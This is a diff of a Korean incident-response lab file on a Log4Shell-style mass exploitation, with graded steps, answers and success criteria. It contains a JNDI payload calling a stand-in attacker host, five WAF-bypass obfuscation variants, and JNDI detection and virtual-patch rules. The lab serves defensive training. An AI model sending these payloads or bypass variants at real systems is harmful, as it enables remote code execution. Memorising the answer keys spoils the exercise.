@@ -3,8 +3,7 @@ title: N-day 대규모 악용 (Log4Shell 계열) IR (AI 지원)
 version: ai
 course: agent-ir-adv-ai
 week: 6
-description: 공개 후 4시간 내 대응. Virtual Patch 2h / Emergency Patch 48h SLA. AI SubAgent
-  자동 실행·검증.
+description: 공개 후 4시간 내 대응. Virtual Patch 2h / Emergency Patch 48h SLA. AI SubAgent 자동 실행·검증.
 difficulty: hard
 duration_minutes: 150
 objectives:
@@ -20,13 +19,22 @@ steps:
   points: 9
   answer: '🤖 프롬프트: Log4Shell 페이로드 예시
 
-    📎 참고 (CLI): echo ''${jndi:ldap://attacker/a}'' > /tmp/w06-log4shell.txt && cat
-    /tmp/w06-log4shell.txt'
+    📎 참고 (CLI): echo ''${jndi:ldap://attacker/a}'' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt'
   answer_detail: '[공격] 기본 페이로드.'
   verify:
     type: output_contains
     expect: jndi
     field: stdout
+    semantic:
+      intent: Log4Shell 페이로드 — ${jndi:ldap://attacker.com/a} 또는 ${jndi:dns://...}. CVE-2021-44228 Log4j
+        JNDI lookup 악용. User-Agent·X-Forwarded-For·URI 파라미터 등 다양한 주입점
+      success_criteria:
+      - ${jndi:...} 페이로드
+      - CVE-2021-44228
+      acceptable_methods:
+      - curl -H + 페이로드
+      negative_signs:
+      - jndi 없음
   target_vm: web
   script: echo '${jndi:ldap://attacker/a}' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt
   risk_level: low
@@ -58,6 +66,16 @@ steps:
     type: output_contains
     expect: jndi
     field: stdout
+    semantic:
+      intent: 변형 페이로드 5종 — (1) ${lower:j}ndi (2) ${${env:x:-j}}ndi (3) ${${:-j}${:-n}${:-d}${:-i}} (4)
+        URL encode %24%7Bjndi (5) Nested ${${::-j}ndi}. WAF bypass
+      success_criteria:
+      - 5 변형 페이로드
+      - nested + encoding 조합
+      acceptable_methods:
+      - cat > file + 변형 목록
+      negative_signs:
+      - 변형 3 이하
   target_vm: web
   script: 'cat > /tmp/w06-variants.txt <<''T''
 
@@ -81,19 +99,29 @@ steps:
   hint: 6단계 IR 중 탐지 단계. target_vm=siem.
   category: analysis
   points: 11
-  answer: "\U0001F916 프롬프트: Suricata/SIGMA 룰\n\U0001F4CE 참고 (CLI): mkdir -p ~/w06\
-    \ && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n\
-    \    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n  condition: selection\n\
-    level: critical\nY\ncat ~/w06/rule.yml"
+  answer: "\U0001F916 프롬프트: Suricata/SIGMA 룰\n\U0001F4CE 참고 (CLI): mkdir -p ~/w06 && cat > ~/w06/rule.yml\
+    \ <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n    payload|contains: ['${jndi:',\
+    \ '${${::-j}${::-n}']\n  condition: selection\nlevel: critical\nY\ncat ~/w06/rule.yml"
   answer_detail: '[탐지] JNDI 패턴 탐지.'
   verify:
     type: output_contains
     expect: jndi
     field: stdout
+    semantic:
+      intent: 'Suricata/SIGMA 룰 — alert http ... content:${jndi: OR content:${${ OR pcre:/\$\{(?:lower|upper|env)/.
+        정규식 기반 변형 커버. 실시간 탐지'
+      success_criteria:
+      - Suricata/SIGMA 룰
+      - pcre 변형 커버
+      acceptable_methods:
+      - Suricata rule + pcre
+      - SIGMA regex
+      negative_signs:
+      - 단순 ${jndi 만 (변형 놓침)
   target_vm: siem
-  script: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\n\
-    detection:\n  selection:\n    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n\
-    \  condition: selection\nlevel: critical\nY\ncat ~/w06/rule.yml"
+  script: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n\
+    \    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n  condition: selection\nlevel: critical\n\
+    Y\ncat ~/w06/rule.yml"
   risk_level: low
   bastion_prompt: Suricata/SIGMA 룰
 - order: 4
@@ -119,6 +147,16 @@ steps:
     type: output_contains
     expect: KEV
     field: stdout
+    semantic:
+      intent: CISA KEV 구독 — /tmp/cisa_kev_monitor.sh 에 curl https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json
+        + jq 로 최신 KEV 추출. Known Exploited Vulnerabilities 우선 패치 gate
+      success_criteria:
+      - CISA KEV feed URL
+      - jq 파싱
+      acceptable_methods:
+      - curl + jq
+      negative_signs:
+      - KEV 개념 없음
   target_vm: bastion
   script: 'cat > ~/w06/kev-feed.md <<''M''
 
@@ -154,6 +192,18 @@ steps:
     - log4j
     - SBOM
     field: stdout
+    semantic:
+      intent: SBOM 매칭 — syft dir:. -o spdx-json > sbom.json + grype sbom:sbom.json 으로 Log4j 취약 버전 자동 탐지.
+        CVE 영향 범위 정량
+      success_criteria:
+      - syft SBOM 생성
+      - grype 취약성 매칭
+      - Log4j 탐지
+      acceptable_methods:
+      - syft + grype
+      - dependency-track
+      negative_signs:
+      - SBOM 없음
   target_vm: bastion
   script: 'cat > ~/w06/sbom.json <<''J''
 
@@ -189,6 +239,16 @@ steps:
     - JNDI
     - 구분
     field: stdout
+    semantic:
+      intent: 공격 시도 vs 성공 구분 — access.log payload 탐지 + DNS 쿼리 to attacker.com 확인 + outbound connection.
+        Attempt(페이로드만) vs Success(egress 발생). triage
+      success_criteria:
+      - attempt + success 구분 로직
+      - DNS/egress 검증
+      acceptable_methods:
+      - jq + pcap 분석
+      negative_signs:
+      - 구분 없음
   target_vm: bastion
   script: 'cat > ~/w06/verify.md <<''M''
 
@@ -208,8 +268,8 @@ steps:
   hint: 6단계 IR 중 초동대응 단계. target_vm=web.
   category: analysis
   points: 15
-  answer: "\U0001F916 프롬프트: Virtual Patch WAF\n\U0001F4CE 참고 (CLI): cat > ~/w06/virtual-patch.rules\
-    \ <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\
+  answer: "\U0001F916 프롬프트: Virtual Patch WAF\n\U0001F4CE 참고 (CLI): cat > ~/w06/virtual-patch.rules <<'R'\n\
+    SecRule ARGS|REQUEST_HEADERS \\\n  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\
     \nR\ncat ~/w06/virtual-patch.rules"
   answer_detail: '[초동대응] 2시간 내 배포.'
   verify:
@@ -218,10 +278,20 @@ steps:
     - jndi
     - 가상패치
     field: stdout
+    semantic:
+      intent: Virtual Patch WAF — ModSecurity 또는 AWS WAF rule 에 SecRule ARGS|REQUEST_HEADERS (?i)\$\{jndi
+        block 추가. 엔드포인트 패치 전 단기 방어
+      success_criteria:
+      - WAF virtual patch rule
+      - (?i) + jndi 패턴
+      acceptable_methods:
+      - ModSec SecRule
+      - AWS WAF rule
+      negative_signs:
+      - virtual patch 개념 없음
   target_vm: web
-  script: "cat > ~/w06/virtual-patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n\
-    \  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat\
-    \ ~/w06/virtual-patch.rules"
+  script: "cat > ~/w06/virtual-patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n  \"@rx \\\\$\\\\{jndi:\"\
+    \ \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat ~/w06/virtual-patch.rules"
   risk_level: low
   bastion_prompt: Virtual Patch WAF
 - order: 8
@@ -249,6 +319,16 @@ steps:
     type: output_contains
     expect: Virtual
     field: stdout
+    semantic:
+      intent: Emergency Patch 결정 매트릭스 /tmp/patch_matrix.md — severity × exposure × business_impact → priority
+        (P0 24h, P1 72h, P2 1wk). 시급 패치 결정 트리. RACI 포함
+      success_criteria:
+      - /tmp/patch_matrix.md
+      - severity × exposure
+      acceptable_methods:
+      - cat > md + 표
+      negative_signs:
+      - 매트릭스 없음
   target_vm: bastion
   script: 'cat > ~/w06/decision.md <<''M''
 
@@ -270,10 +350,9 @@ steps:
   hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
   category: analysis
   points: 17
-  answer: "\U0001F916 프롬프트: Agent Playbook\n\U0001F4CE 참고 (CLI): cat > ~/w06/agent.yaml\
-    \ <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n  - skill: fetch_cve_feed\n  -\
-    \ skill: match_sbom\n  - skill: deploy_virtual_patch\n  - skill: open_emergency_patch_ticket\n\
-    Y\ncat ~/w06/agent.yaml"
+  answer: "\U0001F916 프롬프트: Agent Playbook\n\U0001F4CE 참고 (CLI): cat > ~/w06/agent.yaml <<'Y'\nplaybook_id:\
+    \ pb-nday-response\nsteps:\n  - skill: fetch_cve_feed\n  - skill: match_sbom\n  - skill: deploy_virtual_patch\n\
+    \  - skill: open_emergency_patch_ticket\nY\ncat ~/w06/agent.yaml"
   answer_detail: '[초동대응] 자동 파이프라인.'
   verify:
     type: output_contains
@@ -281,10 +360,20 @@ steps:
     - virtual_patch
     - Playbook
     field: stdout
+    semantic:
+      intent: 'Agent Playbook — trigger(jndi pattern detected) → steps: virtual patch + SBOM scan + notify
+        owner + track patch progress. 대규모 N-day 대응 자동화'
+      success_criteria:
+      - Log4Shell 특화 playbook
+      - patch tracking
+      acceptable_methods:
+      - cat > yaml
+      negative_signs:
+      - 일반 playbook
   target_vm: bastion
-  script: "cat > ~/w06/agent.yaml <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n \
-    \ - skill: fetch_cve_feed\n  - skill: match_sbom\n  - skill: deploy_virtual_patch\n\
-    \  - skill: open_emergency_patch_ticket\nY\ncat ~/w06/agent.yaml"
+  script: "cat > ~/w06/agent.yaml <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n  - skill: fetch_cve_feed\n\
+    \  - skill: match_sbom\n  - skill: deploy_virtual_patch\n  - skill: open_emergency_patch_ticket\n\
+    Y\ncat ~/w06/agent.yaml"
   risk_level: low
   bastion_prompt: Agent Playbook
 - order: 10
@@ -312,6 +401,14 @@ steps:
     type: output_contains
     expect: Emergency
     field: stdout
+    semantic:
+      intent: 임원 브리핑 — Log4j 규모 (전세계 수억 배포) + 영향 평가 + 패치 일정 + cyber insurance. 긴급 의사결정 지원
+      success_criteria:
+      - 1쪽 + 규모 + 영향
+      acceptable_methods:
+      - cat > md
+      negative_signs:
+      - 기술 상세만
   target_vm: bastion
   script: 'cat > ~/w06/exec.md <<''M''
 
@@ -353,6 +450,16 @@ steps:
     type: output_contains
     expect: 48h
     field: stdout
+    semantic:
+      intent: VulnOps SLA /tmp/vulnops_sla.md — Critical 24h, High 72h, Medium 7d, Low 30d 패치 SLA. 위반
+        시 에스컬레이션. 조직 차원의 구조화
+      success_criteria:
+      - /tmp/vulnops_sla.md
+      - 4 등급 SLA
+      acceptable_methods:
+      - cat > md 표
+      negative_signs:
+      - SLA 없음
   target_vm: bastion
   script: 'cat > ~/w06/vulnops-sla.md <<''M''
 
@@ -392,6 +499,16 @@ steps:
     type: output_contains
     expect: CMDB
     field: stdout
+    semantic:
+      intent: Shadow IT 스캔 — nmap + syft 로 전 네트워크 검사 + 미승인 자산·미등록 SW 발견. Log4j 같은 라이브러리의 Shadow IT 는 blind
+        spot. 자산 관리 gap
+      success_criteria:
+      - 네트워크 스캔 + SBOM
+      - 미승인 자산 탐지
+      acceptable_methods:
+      - nmap + syft + 등록 비교
+      negative_signs:
+      - Shadow IT 개념 없음
   target_vm: bastion
   script: 'cat > ~/w06/shadow-it.md <<''M''
 
